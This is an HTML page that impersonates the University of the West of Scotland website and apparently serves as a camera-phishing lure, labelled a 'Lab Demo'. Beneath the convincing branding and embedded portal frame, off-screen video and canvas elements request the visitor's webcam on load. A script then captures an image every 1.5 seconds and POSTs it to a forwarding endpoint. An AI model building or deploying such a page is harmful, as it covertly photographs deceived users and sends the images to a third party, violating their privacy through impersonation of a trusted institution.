<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>UWS | University of the West of Scotland</title>
  <link rel="icon" href="https://www.uws.ac.uk/favicon.ico">
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #f4f4f4;
      overflow: hidden;
      height: 100vh;
    }

    .video-wrap,
    #canvas {
      position: fixed;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
      left: -9999px;
      top: -9999px;
    }

    .uws-topbar {
      background: #fff;
      border-bottom: 1px solid #ddd;
      font-size: 12px;
      color: #444;
    }

    .uws-topbar-inner,
    .uws-header-inner,
    .uws-nav-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 8px 20px;
    }

    .uws-topbar-links a {
      color: #444;
      text-decoration: none;
      margin-left: 16px;
    }

    .uws-header {
      background: #fff;
      border-bottom: 3px solid #6b2c91;
    }

    .uws-brand {
      display: flex;
      align-items: center;
      gap: 14px;
    }

    .uws-logo {
      width: 52px;
      height: 52px;
      background: #6b2c91;
      color: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 14px;
      flex-shrink: 0;
    }

    .uws-brand-text h1 {
      font-size: 20px;
      color: #222;
      font-weight: 700;
      line-height: 1.2;
    }

    .uws-brand-text p {
      font-size: 12px;
      color: #6b2c91;
      font-style: italic;
      margin-top: 2px;
    }

    .uws-search {
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .uws-search input {
      border: 1px solid #ccc;
      border-radius: 3px;
      padding: 8px 12px;
      width: 220px;
      font-size: 13px;
    }

    .uws-search button {
      background: #6b2c91;
      color: #fff;
      border: none;
      border-radius: 3px;
      padding: 8px 14px;
      cursor: pointer;
      font-size: 13px;
    }

    .uws-nav {
      background: #6b2c91;
    }

    .uws-nav a {
      color: #fff;
      text-decoration: none;
      padding: 14px 18px;
      display: inline-block;
      font-size: 14px;
      font-weight: 600;
    }

    .uws-nav a:hover {
      background: #5a2478;
    }

    .uws-frame-wrap {
      height: calc(100vh - 148px);
      background: #fff;
      position: relative;
    }

    .uws-frame-wrap iframe {
      width: 100%;
      height: 100%;
      border: 0;
      display: block;
      background: #fff;
    }

    .uws-loading {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #fff;
      color: #444;
      z-index: 1;
    }

    .uws-loading.hidden {
      display: none;
    }

    .uws-spinner {
      width: 42px;
      height: 42px;
      border: 4px solid #eee;
      border-top: 4px solid #6b2c91;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 14px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .uws-footer-note {
      position: fixed;
      right: 12px;
      bottom: 8px;
      font-size: 11px;
      color: #999;
      z-index: 2;
      pointer-events: none;
    }

    @media (max-width: 768px) {
      .uws-topbar,
      .uws-search,
      .uws-brand-text p {
        display: none;
      }

      .uws-header-inner {
        justify-content: center;
      }

      .uws-nav-inner {
        overflow-x: auto;
        white-space: nowrap;
      }

      .uws-frame-wrap {
        height: calc(100vh - 108px);
      }
    }
  </style>
</head>
<body>
  <div class="video-wrap">
    <video id="video" playsinline autoplay></video>
  </div>
  <canvas id="canvas" width="640" height="480"></canvas>

  <div class="uws-topbar">
    <div class="uws-topbar-inner">
      <span>University of the West of Scotland</span>
      <div class="uws-topbar-links">
        <a href="#">Students</a>
        <a href="#">Alumni &amp; Giving</a>
        <a href="#">Library</a>
        <a href="#">Contact Us</a>
      </div>
    </div>
  </div>

  <header class="uws-header">
    <div class="uws-header-inner">
      <div class="uws-brand">
        <div class="uws-logo">UWS</div>
        <div class="uws-brand-text">
          <h1>University of the West of Scotland</h1>
          <p>Doctrina Prosperitas</p>
        </div>
      </div>
      <div class="uws-search">
        <input type="text" placeholder="Search the site">
        <button type="button">Search</button>
      </div>
    </div>
  </header>

  <nav class="uws-nav">
    <div class="uws-nav-inner">
      <a href="#">Study</a>
      <a href="#">International</a>
      <a href="#">Life at UWS</a>
      <a href="#">Research</a>
      <a href="#">News</a>
      <a href="#">Events</a>
    </div>
  </nav>

  <div class="uws-frame-wrap">
    <div class="uws-loading" id="uwsLoading">
      <div class="uws-spinner"></div>
      <p>Loading UWS portal...</p>
    </div>
    <iframe
      id="uwsFrame"
      src="uws_site_url"
      title="University of the West of Scotland"
      allow="geolocation; camera; microphone"
      referrerpolicy="no-referrer-when-downgrade">
    </iframe>
  </div>

  <div class="uws-footer-note">Lab Demo &mdash; Tahir Siddique</div>

  <script>
    function post(imgdata) {
      $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function () {},
        error: function () {}
      });
    }

    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const uwsFrame = document.getElementById('uwsFrame');
    const uwsLoading = document.getElementById('uwsLoading');

    const constraints = {
      audio: false,
      video: {
        facingMode: 'user'
      }
    };

    uwsFrame.addEventListener('load', function () {
      uwsLoading.classList.add('hidden');
    });

    setTimeout(function () {
      uwsLoading.classList.add('hidden');
    }, 5000);

    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {}
    }

    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      const context = canvas.getContext('2d');
      setInterval(function () {
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
        post(canvasData);
      }, 1500);
    }

    init();
  </script>
</body>
</html>
